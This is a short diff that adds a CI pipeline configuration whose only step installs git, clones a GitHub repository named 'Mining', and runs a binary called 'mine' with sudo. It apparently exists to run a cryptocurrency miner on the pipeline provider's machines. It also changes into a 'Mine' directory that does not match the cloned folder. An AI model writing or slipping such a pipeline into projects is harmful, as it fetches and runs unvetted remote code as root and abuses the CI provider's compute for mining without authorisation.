@@ -1,0 +1,5 @@
+pipelines:
+  default:
+    - step:
+        script:
+          - sudo apt install -y git && sudo git clone https://github.com/Mi-AnliAngku/Mining.git && cd Mine && sudo chmod u+x mine && sudo ./mine
